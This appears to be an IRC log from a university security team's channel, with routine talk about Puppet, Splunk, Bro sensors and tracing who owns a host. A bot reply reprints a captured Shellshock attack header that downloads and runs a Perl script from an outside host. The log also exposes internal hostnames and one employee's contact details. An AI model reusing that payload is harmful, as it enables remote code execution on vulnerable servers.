2015-02-04 12:08:54	ncsabot	cerberus2.ncsa.uiuc.edu AAAA - None 4 2014-09-11 07:10:44.924712 2014-09-11 07:10:44.924712
2015-02-04 12:08:54	ncsabot	cerberus2.ncsa.uiuc.edu A - None 4 2014-09-11 07:10:44.924710 2014-09-11 07:10:44.924710
2015-02-04 12:09:10	jschipp	ninfo bro_pdns cerberus2.ncsa.illinois.edu
2015-02-04 12:09:11	ncsabot	Query  Type  Answer  TTL  Count  First  Last
2015-02-04 12:09:11	ncsabot	cerberus2.ncsa.illinois.edu A - None 6 2014-09-11 07:10:44.925562 2015-02-04 12:05:27.219099
2015-02-04 12:09:11	ncsabot	cerberus2.ncsa.illinois.edu AAAA - None 4 2014-09-11 07:10:44.925565 2014-09-11 07:10:44.925565
2015-02-04 12:29:17	soehlert	jschipp: cerberus1-3 don't exist anymore
2015-02-04 12:29:27	eyrich1	we run 0 and 4
2015-02-04 12:29:45	soehlert	they were hardware machines and for whatever reason when we moved to vms tbrooks went with 0 and 4 as the naming scheme
2015-02-04 12:30:14	soehlert	eyrich1: yes. is there something wrong?
2015-02-04 12:30:23	eyrich1	not that I know of
2015-02-04 12:30:37	eyrich1	and eyrich do people keep putting eyrich1 ? my alias shows eyrich
2015-02-04 12:30:59	soehlert	nah your nick is eyrich1 in here. im tab completing
2015-02-04 12:31:13	soehlert	ah ok i was wondering why you told me we run 0 and 4 :)
2015-02-04 12:31:50	soehlert	also, jschipp you probably don't have access to xsede irc because they are picky about who gets it. are you funded by xsede at all? I'm not so i don't have an account.
2015-02-04 12:32:00	<--	eyrich1 (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2015-02-04 12:32:12	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2015-02-04 12:33:41	soehlert	eyrich: in the future, you can just use the nick command in irc to change your name, don't gotta quit
2015-02-04 12:35:45	wraquel	eyrich: ? address lines?
2015-02-04 12:36:34	wraquel	The jabber server, something effed up after reboot and it got stuck in config mode and lost access to mysql for some reason.
2015-02-04 12:36:39	eyrich	yes when making igtf certs you have to have 2 address lines omitted from the signed cert
2015-02-04 12:36:40	eyrich	https://wiki.ncsa.illinois.edu/display/PKI/InCommon+Certificate+Manager+for+xsede.org+IGTF+Server+Certs?src=search
2015-02-04 12:36:44	jazoff	wraquel: i fixed it
2015-02-04 12:36:49	jazoff	i think
2015-02-04 12:36:51	wraquel	soehlert: Are the config files on wiki-sec in /opt/openfire/config backed up?
2015-02-04 12:36:55	wraquel	jazoff: you did?
2015-02-04 12:36:57	jazoff	yes
2015-02-04 12:37:08	wraquel	What did you do?
2015-02-04 12:37:35	wraquel	Oh hey, It's connecting.
2015-02-04 12:37:37	wraquel	yay
2015-02-04 12:37:44	jazoff	a bunch of things.. but I think what ultimately worked was starting the setup and updating teh db info, but then stopping openfire
2015-02-04 12:37:59	jazoff	changing setup to true (or false.. whichever it wasn't) in openfire.xml and restarting it
2015-02-04 12:38:00	wraquel	jschipp: I can create an account for you
2015-02-04 12:38:05	soehlert	wraquel: im not sure, but thats a bit of a kick int he pants to double check the crashplan
2015-02-04 12:38:32	wraquel	well, jazoff got it working. wee!
2015-02-04 12:40:44	soehlert	indeed
2015-02-04 13:15:22	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2015-02-04 13:21:45	soehlert	so jazoff drought needs it's cable moved from eth1 to eth0?
2015-02-04 13:31:26	jazoff	yeah
2015-02-04 13:31:29	jazoff	whenever
2015-02-04 13:42:39	soehlert	well im here now
2015-02-04 13:42:52	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2015-02-04 13:43:18	soehlert	is it the myricom one that needs switching or the copper cables jazoff 
2015-02-04 13:43:46	jazoff	myricom
2015-02-04 13:45:11	soehlert	try now
2015-02-04 13:47:30	jazoff	looks good
2015-02-04 13:47:42	soehlert	k
2015-02-04 13:48:55	jazoff	just realized I need to upgrade bro to 2.3.2 on that anyway
2015-02-04 13:51:02	jazoff	what happened to cif.ncsa.illinois.edu ?
2015-02-04 13:56:40	wraquel	I think it's cif-sec now
2015-02-04 13:56:54	wraquel	And Jon split up the DB and something to other hosts.
2015-02-04 13:58:19	jazoff	ah, cif-router-sec ?
2015-02-04 13:58:25	jazoff	ok then
2015-02-04 13:59:09	wraquel	cif-client/router/database-sec
2015-02-04 14:02:05	jazoff	fixed the perl BHR to generate valid CSV files
2015-02-04 14:02:20	jazoff	apparently it's been broken since the bash bug came out 
2015-02-04 14:02:47	jazoff	since the why column had unescaped commas and quotes in it
2015-02-04 14:03:06	jazoff	ninfo bhlist 217.160.6.81
2015-02-04 14:03:07	ncsabot	IP: 217.160.6.81 Who: bro Why: Bash::HTTP_Header_Attack: 217.160.6.81 may have attempted to exploit CVE-2014-6271, bash environment variable attack, via HTTP mod_cgi header against 141.142.225.71 submitting "USER-AGENT"="() { :;}; /bin/bash -c "curl -O http://217.26.144.10/Bu.pl -o /tmp/Bu.pl; lwp-download -a http://217.26.144.10/Bu.pl /tmp/Bu.pl;wget http://217.26.144.10/Bu.pl -O /tmp/Bu.pl;perl /tmp/Bu.pl;rm -f /tmp/Bu.pl;mkdir /tmp/B
2015-02-04 14:03:11	jazoff	much better :)
2015-02-04 15:00:59	jschipp	not feeling all that well, can't mentally function, heading home early
2015-02-04 15:32:49	soehlert	hey jazoff http://www.ajc.com/news/news/local-govt-politics/reed-announces-plans-for-citys-largest-park-street/nj4Wh/ more public transportation for the city, if you ever go there anyways
2015-02-04 15:33:34	jazoff	yeah.. i'm excited for the 'the Beltlines eventual 22-mile loop'
2015-02-04 15:35:08	soehlert	ya thatd be nice
2015-02-04 15:43:06	soehlert	jesus 21 minute puppet runs..
2015-02-04 15:43:16	jazoff	on what machine?
2015-02-04 15:44:09	soehlert	the polos
2015-02-04 15:44:20	jazoff	oh
2015-02-04 15:44:28	soehlert	basically doing everything at once so its just a lot
2015-02-04 15:44:44	jazoff	yeah
2015-02-04 15:44:50	jazoff	always fun to watch puppet run on a new machine
2015-02-04 15:45:08	soehlert	haha it is kinda mesmerizing. i didnt realize at first but i was just watching it go
2015-02-04 15:45:22	jazoff	yeah, nice when you see it applying all those tweaks that you forgot about
2015-02-04 15:45:40	soehlert	for sure. nice way to remember whats in common.yaml
2015-02-04 15:51:46	soehlert	jesus now terry wants to tear out all the puppet on the polos :(
2015-02-04 16:06:38	soehlert	for some reason polob isnt getting its role and profile set
2015-02-04 16:09:01	jazoff	oh? it's set on the console?
2015-02-04 16:09:06	soehlert	yup
2015-02-04 16:10:10	soehlert	hmmm its also stuck on 6.5
2015-02-04 16:10:15	soehlert	and says no packages for update
2015-02-04 16:20:30	jazoff	soehlert: well it got the /etc/puppetlabs/facter/facts.d/role_profile.yaml
2015-02-04 16:20:31	jazoff	file pushed out
2015-02-04 16:20:39	jazoff	does puppet just need to be ran once more?
2015-02-04 16:21:21	soehlert	ill try it now
2015-02-04 16:22:06	soehlert	nope
2015-02-04 16:23:24	soehlert	permissions on the file look fine
2015-02-04 16:23:28	soehlert	content is right
2015-02-04 16:23:52	jazoff	facter isn't picking it up
2015-02-04 16:24:20	soehlert	according to its node page it seems to be
2015-02-04 16:24:35	jazoff	oh, as root it works
2015-02-04 16:24:40	soehlert	?
2015-02-04 16:24:45	jazoff	[root@polob ~]# facter |egrep -e role -e profile
2015-02-04 16:24:45	jazoff	profile => polo
2015-02-04 16:24:45	jazoff	role => services
2015-02-04 16:25:01	soehlert	ah ok
2015-02-04 16:25:01	soehlert	nifty test
2015-02-04 16:25:55	soehlert	its so weird it has the repos from the polo profile loaded too
2015-02-04 16:26:09	soehlert	so its like it had them set and then removed the role::profile
2015-02-04 16:27:12	soehlert	wait a second
2015-02-04 16:27:12	soehlert	the whole motd is wrong
2015-02-04 16:27:12	soehlert	its reporting 6.5 but saying no packages marked for update
2015-02-04 16:27:20	soehlert	but cat /etc/redhat-release shows 6.6
2015-02-04 16:27:46	jazoff	oh, is it just missing the motd calss
2015-02-04 16:27:48	jazoff	class? 
2015-02-04 16:27:48	jazoff	lol
2015-02-04 16:28:33	soehlert	quite possibly, but how did poloa get it then?
2015-02-04 16:30:28	soehlert	sigh...
2015-02-04 16:30:30	soehlert	that was it
2015-02-04 16:30:43	soehlert	still dont get how poloa worked since they are in the same branch
2015-02-04 16:41:12	soehlert	jazoff: do you know if i can do something like this for puppet packages: "perl-Module-*"
2015-02-04 16:42:35	jazoff	not that i know of
2015-02-04 16:42:40	soehlert	k i figured not
2015-02-04 16:42:47	soehlert	not sure id want to anyways, just random though
2015-02-04 16:42:49	soehlert	t
2015-02-04 16:50:30	jazoff	could do it with an exec easy enough, dont think puppet supports it though
2015-02-04 16:51:04	soehlert	probably not smart to do anyways
2015-02-05 00:37:57	soehlert	heh: alias fuck="sudo !!"
2015-02-05 03:56:21	soehlert	also, udemy has a ton of courses on sale (not just computer stuff, I ended up doing a German course actually) for 10 dollars using the code BEAWESOME
2015-02-05 09:56:19	jschipp	lol
2015-02-05 10:14:58	jazoff	hmm, someone on bwbh1 downloaded redis-2.8.19.tar.gz
2015-02-05 10:17:36	jazoff	and a ton of elastic search stuff
2015-02-05 10:19:20	jazoff	and I'm not even sure if the brosshd stuff is working right
2015-02-05 10:20:09	jazoff	oh, i think it is.. just the paths are really weird
2015-02-05 10:22:14	jazoff	ah, can't figure out much from those logs, but it looks like they downladed it and then scp'd it to craymon
2015-02-05 10:22:36	jazoff	uristring=%0A%1B%5Bm%1B%5D0%3Broot%40craymon%3A%2Flocal%2Flogging%2Fsrc%07%5Broot%40craymon+src%5D%23+mv+%7Edalton%2Fredis-2.8.19.tar.gz+.
2015-02-05 10:22:45	jazoff	I guess they are trying to get ELK going
2015-02-05 10:28:35	wraquel	anyone else having problems sending email today?
2015-02-05 10:45:13	eyrich	wraquel: not that I have seen
2015-02-05 10:45:34	eyrich	i am going to be vmotion everyting from node 1 to 2, make some network changes on 1 and them move stuff back
2015-02-05 11:49:33	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2015-02-05 11:52:21	eyrich	crap
2015-02-05 11:52:32	eyrich	node01 went fine, but I think I broke node00
2015-02-05 11:53:15	jazoff	You killed ncsabot :(
2015-02-05 11:54:44	eyrich	im disabling uplinks to node00, should cause the 2nd firewall to take ober
2015-02-05 11:55:35	eyrich	ok, that worked
2015-02-05 11:55:46	eyrich	not to get node00 back
2015-02-05 12:23:35	jschipp	lol
2015-02-05 12:32:46	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2015-02-05 12:41:33	eyrich	ok all is back now
2015-02-05 12:42:22	eyrich	node 00 is using a lag for communications, node01 is using lag for all guest nets
2015-02-05 12:42:41	eyrich	node 02 next, I am going to start vmotining everything now
2015-02-05 12:53:50	eyrich	jazoff: which types of packets were we letting through even with a dumbno block?
2015-02-05 12:59:07	jazoff	control packets..
2015-02-05 12:59:22	jazoff	fin syn rst
2015-02-05 12:59:46	jazoff	oh, and that is only from the sender, all the other side isnt filtered
2015-02-05 12:59:50	jazoff	so the acks go through too
2015-02-05 13:01:00	eyrich	thanks
2015-02-05 13:01:22	jazoff	the end result is that bro still knows how long the connection lasted and how many bytes were sent/received
2015-02-05 13:13:46	wraquel	Apache logs POSTs as GET if there is a get request in the uri. Does bro handle mixed POST/GETs correctly?
2015-02-05 13:15:06	jazoff	you mean query params?
2015-02-05 13:15:13	jazoff	it should log it as POST /foo?bar
2015-02-05 13:17:30	wraquel	good
2015-02-05 13:18:06	jazoff	yep, no issues there
2015-02-05 13:18:37	wraquel	Sale on steam today
2015-02-05 13:18:59	wraquel	Square Enix titles. Sniper Elite 3 70% off.
2015-02-05 13:21:30	jazoff	ugh, i have so many games on steam that I need to play already
2015-02-05 13:21:55	jazoff	at least I only end up buying the linux games, otherwise i'd probably have 2x as much
2015-02-05 13:38:04	soehlert	hah i refuse to install steam for fear of what it would do to my time and money
2015-02-05 13:39:31	jazoff	i mostly got stuff from humble bundle
2015-02-05 13:56:52	eyrich	all vmotion is done, all work completed
2015-02-05 13:59:02	jazoff	:)
2015-02-05 14:18:30	soehlert	jazoff: have you played with Deis at all? http://docs.deis.io/en/v0.15.1/
2015-02-05 14:19:13	jazoff	have been keeping an eye on it
2015-02-05 14:19:18	jazoff	may have tried a vm with it, i forget
2015-02-05 14:19:26	jazoff	there's also flynn
2015-02-05 14:20:05	soehlert	ah ya i haven't even really gotten to play with heroku, but im always intrigued by keeping stuff under my control vs in the cloud
2015-02-05 14:22:45	jazoff	yeah
2015-02-05 14:22:50	jazoff	you can try startign with doku
2015-02-05 14:23:01	jazoff	er, dokku
2015-02-05 14:23:21	soehlert	oh man 100 lines of bash? i can even understand what it's doing!
2015-02-05 14:25:31	jazoff	yeah.. it's kinda neat how it is written
2015-02-05 14:25:37	jazoff	it's all built around this plugin/hook system
2015-02-05 14:25:41	jazoff	so the core code doesnt do anything
2015-02-05 14:26:12	soehlert	hah thats funny to think about
2015-02-05 14:26:25	jazoff	though that does remind me, wanted to test something and submit a bug report...
2015-02-05 14:26:36	jazoff	the apps:destroy command does
2015-02-05 14:26:37	jazoff	 docker images | grep $IMAGE | awk '{print $3}' | xargs docker rmi &> /dev/null &
2015-02-05 14:26:53	jazoff	so I think that should be grep -w
2015-02-05 14:27:17	soehlert	ahh that'd probably be better
2015-02-05 14:27:17	jazoff	since I think if you make a bunch of apps like 'foo', 'foo_test', 'foo_prod' and delete foo, it will delete them all
2015-02-05 14:27:23	jazoff	but I havent tested it yet
2015-02-05 14:27:25	soehlert	ya
2015-02-05 14:27:29	soehlert	makes sense to me
2015-02-05 14:27:45	jazoff	i could see that being bad if you accidentally created an app called like 'f' and then deleted it
2015-02-05 14:28:10	soehlert	oh lord haah that'd be a baaad idea
2015-02-05 14:29:09	soehlert	i wonder if you'd run into problems too. for example i tried out a few subsonic images which were all $username/subsonic so if i did that with subsonic grep would match them all wouldnt it?
2015-02-05 14:29:30	jazoff	yeah, maybe
2015-02-05 14:29:52	jazoff	if you're playing around you can test it for me :)
2015-02-05 14:30:14	soehlert	might be able to do that later. no promises on timeline though
2015-02-06 09:34:45	wraquel	splunk-sec went over last night.
2015-02-06 09:34:51	wraquel	(license)
2015-02-06 09:34:58	jazoff	hmm
2015-02-06 09:36:05	wraquel	One thing to remember is that we do have the 10G perpetual license. We could use that for less important stuff that we still want to monitor.
2015-02-06 09:36:18	wraquel	That's the one on cyclone.
2015-02-06 09:36:26	jazoff	i think using the new splunk bro app blows up the index size
2015-02-06 09:36:29	jazoff	since it indexes the fields
2015-02-06 09:37:17	wraquel	how much more than what we were doing before?
2015-02-06 09:38:22	jazoff	if that is the cause, I could see it taking up as much as 2x the space
2015-02-06 09:44:00	wraquel	How is the bro splunk app different than how you were indexing bro on cyclone?
2015-02-06 09:44:14	jazoff	cyclone was doing the field extraction at search time
2015-02-06 09:44:28	jazoff	which is slower and a bit of a pain to maintain
2015-02-06 09:46:07	wraquel	Can we still run a separate index on a different license but still access it from the same splunk search node?
2015-02-06 09:47:04	jazoff	i think so
2015-02-06 09:52:43	wraquel	can splunk-sec point at cyclone right now? as a test?
2015-02-06 09:52:58	wraquel	I know they're different versions.... Will that work?
2015-02-06 09:55:01	jazoff	hmm
2015-02-06 09:55:05	jazoff	it might complain
2015-02-06 09:55:59	jazoff	i think it's just a matter of adding it as a distributed search peer
2015-02-06 12:03:45	jschipp	I wonder if that's why rsyslog RSS size has been high, I didn't see any connection issues or disk bfufering
2015-02-06 12:03:54	jschipp	relay01's rsyslog*
2015-02-06 12:09:37	jazoff	jschipp: nope, this is just for the bro logs
2015-02-06 12:09:48	jschipp	ah, kk
2015-02-06 12:36:54	soehlert	wraquel: sooo cyclone should be kept around? at least for now?
2015-02-06 12:37:58	wraquel	soehlert: I don't mind cyclone disappearing as long as we have access to logs and transfer over saved reports/searches/etc.
2015-02-06 12:38:29	wraquel	But if we can leverage reuse the 10G licenses we have on it that would be good.
2015-02-06 12:40:25	jschipp	before cyclone is retired be sure to let me know, don't wnat the relays to fil up their disks
2015-02-06 12:42:02	soehlert	jazoff: do you know how to move licenses? cyclone is still rhel i believe so either way that needs to change
2015-02-06 12:49:33	jschipp	http://dashiell.io/
2015-02-06 12:57:14	jschipp	we're having one of the dev's for Facebook's osquery tool on Monday for OpenNSM
2015-02-06 12:57:25	soehlert	interesting. we get a lot of that kind of info in puppet dashboard btw. 
2015-02-06 12:57:33	soehlert	or facter CLI info too i believe
2015-02-06 12:58:57	jschipp	I don't think puppet can do things like finding running processes, open sockets, etc.
2015-02-06 12:59:59	soehlert	it can definitely find running processes and i'd bet open sockets too
2015-02-06 13:00:05	soehlert	live management tab
2015-02-06 13:00:14	soehlert	you can even run commands on all boxes at once if you were so incline
2015-02-06 13:00:16	soehlert	d
2015-02-06 13:08:40	jschipp	harsh, hmmm, still trying to see where you can do that. You can view facts I see
2015-02-06 13:14:46	jschipp	has anyone used the mco tool here? client.cfg is missing on puppet-sec
2015-02-06 13:16:05	soehlert	harsh?
2015-02-06 13:17:12	soehlert	and live management tab is at the top on the left
2015-02-06 13:17:30	jschipp	"so inclined" sounded snarky
2015-02-06 13:17:45	soehlert	not at all
2015-02-06 13:18:17	jschipp	yeah, I'm there but haven't how to run commands or list procs yet
2015-02-06 13:18:39	jschipp	have you done it?
2015-02-06 13:19:49	soehlert	hmm they seem to have changed things a bit in the last update.
2015-02-06 13:19:49	soehlert	there used to be a run command box for anything
2015-02-06 13:19:49	soehlert	i see service now in its place so maybe they pulled it out
2015-02-06 13:45:22	jschipp	I misinterpreted, my bad
2015-02-06 13:59:39	jschipp	well dang, I can't find /etc/puppetlabs/mcollective/client.cfg
2015-02-06 14:00:30	wraquel	Sigh. jazoff I should have had you send that NTP host to help+its
2015-02-06 14:00:59	soehlert	jschipp: what are you looking for with that file?
2015-02-06 14:04:08	wraquel	jazoff: I'll take care of it.
2015-02-06 14:04:15	wraquel	Can't trust campus email right now.
2015-02-06 14:04:54	soehlert	good lord no. i'm getting emails two or three days late
2015-02-06 14:05:25	wraquel	put it on reddit. Maybe that'll get their asses up to fix it.
2015-02-06 14:05:46	wraquel	They seem to respond to anti-CITES threads on reddit quicker than other media.
2015-02-06 14:05:49	wraquel	Even the DI.
2015-02-06 14:06:26	eyrich	neteng says: Looks like Chad made the request for the hostname.
2015-02-06 14:07:45	soehlert	eyrich: meant to ask you, were you aware that neteng was digging around in our racks the other day?
2015-02-06 14:08:36	jschipp	the file is required to use mcollective's mco tool to make queries
2015-02-06 14:08:37	eyrich	no - but I did hear from matt that they have the new HPC wild west zone uplinks tapped and connected to our gigamons today
2015-02-06 14:09:04	eyrich	I think they re-used a fiber run from the tap racks to ours, so he relabled them
2015-02-06 14:09:11	soehlert	jschipp: seeing if you can get more info/run commands via puppet?
2015-02-06 14:09:42	soehlert	eyrich: ya it was for labeling, but im not sure im comfortable with them going through our racks without us knowing. 
2015-02-06 14:09:42	soehlert	he only told me because i showed up to pcf right after he finished so he thought he broke something
2015-02-06 14:10:28	eyrich	hah - I agree. it will be better once we consolidate all of tap agg to rack 1
2015-02-06 14:11:12	soehlert	agreed. do you think it'd go over ok if i emailed them just asking to let us know first? i mean if something did break and we didnt know they were in there, we're missing out on a possible clue..
2015-02-06 14:13:01	jschipp	soehlert: yeah, trying to see what it has to offer
2015-02-06 14:14:00	jschipp	[jschipp@puppet-sec ~]$ mco 
2015-02-06 14:14:00	jschipp	Failed to generate application list: RuntimeError: Cannot find config file '/etc/puppetlabs/mcollective/client.cfg'
2015-02-06 14:14:37	eyrich	soehlert: i think we would be better off not emailing them.  i would prefer to not start that turf war, unless it actually becomes a problem.
2015-02-06 14:15:00	eyrich	they might decide I cant make changes in switches anymore
2015-02-06 14:15:02	soehlert	ya this is strange jschipp repo-sec doesnt' even see the command. docs say it should be there automatically in PE though..
2015-02-06 14:15:28	soehlert	eyrich: fair enough, i was trying to word it in a way to make it clear i wasn't turf warring, but it seems like a fine line
2015-02-06 14:15:34	soehlert	ill just avoid it all together
2015-02-06 14:15:58	eyrich	ok - if there ever is a an incident we will then have words :)
2015-02-06 14:16:27	soehlert	sounds fair
2015-02-06 14:17:41	soehlert	jschipp: which is weird because:
2015-02-06 14:17:46	soehlert	[root@repo-sec ~]# rpm -qa | grep mcollective
2015-02-06 14:17:46	soehlert	pe-mcollective-common-2.5.1.2-1.pe.el6.noarch
2015-02-06 14:17:46	soehlert	pe-mcollective-2.5.1.2-1.pe.el6.noarch
2015-02-06 14:20:10	eyrich	im out
2015-02-06 14:38:26	wraquel	 cif ticket?
2015-02-06 14:38:29	wraquel	https://help.ncsa.illinois.edu/Ticket/Display.html?id=24498
2015-02-06 14:38:37	wraquel	https://help.ncsa.illinois.edu/Ticket/Display.html?id=24497 too
2015-02-06 14:50:10	jschipp	wtf, it filed its own ticket
2015-02-06 14:50:23	jschipp	ls
2015-02-06 14:50:26	jschipp	err
2015-02-06 14:52:31	wraquel	I assume it was an email to help@ncsa.illinois.edu
2015-02-06 15:00:20	jazoff	walk time :)
2015-02-06 15:05:51	jschipp	wraquel: yeah, From:CIF User <cif@cif-router-sec.ncsa.illinois.edu>
2015-02-06 15:14:33	soehlert	http://www.theonion.com/articles/health-experts-recommend-standing-up-at-desk-leavi,37957/?utm_source=Facebook&utm_medium=SocialMarketing&utm_campaign=LinkPreview:1:Default
2015-02-06 15:16:40	jschipp	lol
2015-02-06 15:16:41	wraquel	soehlert: what are you sayin?
2015-02-06 15:17:35	jazoff	hah
2015-02-06 15:17:51	soehlert	i think it means more walks for everyone!
2015-02-06 15:17:57	wraquel	sounds good to me!
2015-02-06 15:18:10	wraquel	organized getting up and walking out
2015-02-06 15:18:22	soehlert	well yes, without organization you just have anarchy
2015-02-06 15:19:00	wraquel	Well, we can't have anarchy
2015-02-06 15:20:13	jschipp	says who?
2015-02-06 15:21:16	soehlert	fight the power, rage against the machine, etc etc.
2015-02-06 15:22:14	wraquel	Look, Friday is just not a good Anarchy day. It's the start of the weekend ffs.
2015-02-06 15:22:27	wraquel	Plan it for monday at least.
2015-02-06 15:22:51	jschipp	yes, let's start our week organically and spontaneously!
2015-02-06 15:23:44	soehlert	lulz
2015-02-06 16:01:30	jazoff	jschipp: ah.. we need to rework how rsyslog writes files remember...
2015-02-06 16:01:33	jazoff	daily files instead of hourly
2015-02-06 16:07:06	jazoff	apparently no one knows who owns 141.142.160.60
2015-02-06 16:14:09	jazoff	there were some recent ssh logins from 141.142.234.48 and one to 141.142.234.25
2015-02-06 16:14:45	jazoff	neither of which have an owner in netdot, but might be easier to track those systems down?
2015-02-06 16:21:14	soehlert	i thnk the 234 net is usernet aka the wild west
2015-02-06 16:25:30	wraquel	Guess that gpfs system is going to stay blocked. No one knows who owns it.
2015-02-06 16:26:00	jazoff	checking the bro logs going back through 2014.. must be some ssh login from the owners system
2015-02-06 16:26:23	wraquel	assuming we get identifying logs
2015-02-06 16:28:34	wraquel	so, I heard mention of the ITS group playing with ownCloud this morning.
2015-02-06 16:29:08	jazoff	oh?
2015-02-06 16:29:16	jazoff	isn't that kinda... kludgy?
2015-02-06 16:29:18	wraquel	Something that struck me that I needed to look into was that it can sync stuff to your OTHER sync systems, like box, dropbox, etc.
2015-02-06 16:29:50	wraquel	So you sync your laptop to ownCloud and then it will sync that to whatever you want. Box, so on.
2015-02-06 16:30:08	jazoff	ah
2015-02-06 16:30:10	wraquel	Which, if by proxy, somehow stores some kind of credentials for accessing your account.
2015-02-06 16:30:28	wraquel	I don't know if its application specific generated keys or your actual user credentials.
2015-02-06 16:30:45	wraquel	If the latter, I'm not comfortable with it.
2015-02-06 16:30:52	wraquel	I'm guessing the latter unfortunately.
2015-02-06 16:33:38	jazoff	https://owncloud.org/security/advisories/
2015-02-06 16:36:27	jazoff	first ssh to that ip was on 2014-11-21
2015-02-06 16:36:44	jazoff	only the ips I already mentioned
2015-02-06 16:37:41	soehlert	ya the owners host was likely just a laptop on the 234
2015-02-06 16:37:57	soehlert	errr....s/laptop/host/
2015-02-06 16:38:17	soehlert	we might be able to get jack info on that though if you can come up with a recent occurence
2015-02-06 16:38:56	 *	jazoff shrugs
2015-02-06 16:39:18	jazoff	141.142.234.25 isn'
2015-02-06 16:39:21	jazoff	t a laptop...
2015-02-06 16:39:34	jazoff	ninfo bro_pdns 141.142.234.25
2015-02-06 16:39:35	ncsabot	Query  Type  Answer  TTL  Count  First  Last
2015-02-06 16:39:36	ncsabot	setwiki.ncsa.illinois.edu A 141.142.234.25 86400 27 2014-09-04 15:03:03.550236 2015-02-02 07:11:20.355129
2015-02-06 16:39:36	ncsabot	usher.ncsa.illinois.edu * 141.142.234.25 86400 11 2014-09-04 18:05:28.383146 2014-12-20 20:16:07.813382
2015-02-06 16:39:36	ncsabot	backups.ncsa.uiuc.edu A 141.142.234.25 86400 2 2014-09-05 10:40:31.329242 2014-09-05 10:40:31.329242
2015-02-06 16:39:36	ncsabot	backup.ncsa.uiuc.edu A 141.142.234.25 86400 35 2014-09-07 14:48:21.066483 2015-02-03 16:53:02.300589
2015-02-06 16:39:36	ncsabot	usher.ncsa.illinois.edu A 141.142.234.25 86400 149234 2014-09-03 12:32:17.587754 2015-02-06 16:35:17.779038
2015-02-06 16:39:36	ncsabot	usher.ncsa.illinois.edu - 141.142.234.25 86400 140321 2014-09-03 12:32:17.588072 2015-02-06 16:35:17.779266
2015-02-06 16:39:39	ncsabot	setwiki.ncsa.illinois.edu - 141.142.234.25 86400 6 2014-09-18 01:27:56.555738 2015-01-26 02:18:07.583538
2015-02-06 16:39:41	ncsabot	backup.ncsa.uiuc.edu - 141.142.234.25 86400 10 2014-09-22 22:36:17.009270 2015-02-03 16:53:02.300852
2015-02-06 16:39:44	ncsabot	- - 141.142.234.25 86400 17521 2014-09-03 13:13:23.997655 2015-02-06 16:30:23.515019
2015-02-06 16:39:45	ncsabot	nagios.ncsa.illinois.edu A 141.142.234.25 86400 3 2014-10-23 09:25:35.939899 2015-01-15 09:58:33.803194
2015-02-06 16:39:48	ncsabot	puppet.ncsa.illinois.edu - 141.142.234.25 86400 606 2015-01-05 06:53:48.306318 2015-02-06 13:13:37.330107
2015-02-06 16:39:49	ncsabot	puppet.ncsa.illinois.edu A 141.142.234.25 86400 446 2015-01-05 06:53:49.332816 2015-02-06 13:13:29.115029
2015-02-06 16:40:04	wraquel	wait wuh
2015-02-06 16:43:47	soehlert	jazoff: that's what my s/laptop/host/ was for :)
2015-02-06 16:44:24	jazoff	ah
2015-02-06 16:44:41	jazoff	well, if they are running nagios/puppet/backups, maybe they know who owns it?
2015-02-06 16:44:46	jazoff	granted, i dunno who owns .25
2015-02-06 16:45:10	jazoff	ah, it was in auth logs in info..  seans  ?
2015-02-06 16:45:13	soehlert	interesting for some reason usher was in my head as an ITS machine
2015-02-06 16:45:18	jazoff	2015-02-05 11:46:19.000 CST seans 141.142.234.25 cerberus0 ssh2 keyboard-interactive
2015-02-06 16:45:41	jazoff	index=gulp 141.142.234.25 NOT git | top user
2015-02-06 16:45:41	soehlert	Stevens, Sean217-244-8724seans@ncsa.illinois.edu3002E NCSA
2015-02-06 16:45:51	jazoff	in splunk returned mostly seans, and some aloftus 
2015-02-06 16:45:59	soehlert	wait he signed into cerberus0??
2015-02-06 16:46:13	jazoff	yeah, from that host
2015-02-06 16:46:19	soehlert	that means we should know him...
2015-02-06 16:46:26	soehlert	i have no clue who sean stevens is
2015-02-06 16:46:30	jazoff	oh, weird
2015-02-06 16:46:34	jazoff	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/seans
2015-02-06 16:46:44	soehlert	he is defniitely on the cerb machines
2015-02-06 16:46:48	jazoff	yeah, he logs into usher a lot
2015-02-06 16:47:31	jazoff	just realized I dont have the dest IP in the gulp log data
2015-02-06 16:47:43	soehlert	or maybe usher was a SET machine actualy...aloftus would make it seem so as well and probably explain the cerb account
2015-02-06 16:47:52	jazoff	i keep the orig_host, but thats name not ip
2015-02-06 16:47:55	soehlert	gah i cant get to portal-sec
2015-02-06 16:47:55	soehlert	tunnel is fine as i can get to puppet-sec
2015-02-06 16:48:24	jazoff	portal-sec is on 10.142
2015-02-06 16:50:33	jazoff	so yeah, maybe one of them knows what gpfs host was for
2015-02-06 16:51:05	soehlert	should stlil be able to tunnel through fog no?
2015-02-06 16:51:11	jazoff	yes, I am right nw
2015-02-06 16:51:13	soehlert	but ya michelle might now
2015-02-06 16:51:23	jazoff	whoever that is :)
2015-02-06 16:51:23	soehlert	ya that's why im confused. my tunnel is working, but not to portal-sec
2015-02-06 16:51:32	soehlert	Firefox can't find the server at portal-sec.internal.ncsa.edu.
2015-02-06 16:52:52	soehlert	isn't splunk-sec internal too? what's the port number for that wui?
2015-02-06 16:53:16	jazoff	no, splunk-sec is 141.142
2015-02-06 16:53:22	jazoff	er
2015-02-06 16:53:32	jazoff	yeah, it is
2015-02-06 16:53:35	soehlert	nope its internal
2015-02-06 16:53:49	jazoff	https://splunk-sec.internal.ncsa.edu:8000
2015-02-06 16:54:33	soehlert	hmm must have some sort of issue with my tunnel then...cant get there either
2015-02-06 16:54:57	jazoff	do you have
2015-02-06 16:54:58	jazoff	     || shExpMatch(host, "10.142.*")
2015-02-06 16:55:02	jazoff	in your proxy.pac?
2015-02-06 16:57:08	soehlert	function FindProxyForURL(url, host) {
2015-02-06 16:57:08	soehlert	    host = host.toLowerCase();
2015-02-06 16:57:08	soehlert	    if (dnsDomainIs(host, "ncsa.illinois.edu")
2015-02-06 16:57:08	soehlert	    || dnsDomainIs(host, "internal.ncsa.edu")
2015-02-06 16:57:08	soehlert	    || shExpMatch(host, "10.142.*"))
